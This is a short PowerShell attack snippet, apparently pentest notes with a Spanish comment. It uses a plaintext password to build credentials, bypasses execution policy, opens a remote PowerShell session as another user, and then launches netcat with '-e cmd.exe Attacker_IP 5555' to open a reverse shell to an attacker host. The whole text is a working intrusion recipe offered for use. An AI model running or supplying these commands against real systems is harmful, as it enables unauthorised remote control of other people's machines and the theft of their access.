cmd> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile

# Variable definitions
$host_name = 'HostName'
$user_name = 'SomeUser'
$plain_password = 'S3cur3Passw0rd'
$fqdn_username = $host_name + "\" + $user_name
$binary = 'c:\path\to\nc.exe'
$arguments = '-e cmd.exe Attacker_IP 5555'

# Execute "runas process" 
$encripted_password = ConvertTo-SecureString $plain_password -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($fqdn_username, $encripted_password)
Enter-PSSession -ComputerName $host_name -Credential $credentials

# Start binary (reverse shell) ** (OPCIONAL puesto que ya se tiene PS1)
$binary = 'c:\path\to\nc.exe'
$arguments = '-e cmd.exe Attacker_IP 5555'
Start-Process -FilePath $binary -ArgumentList $arguments -NoNewWindow
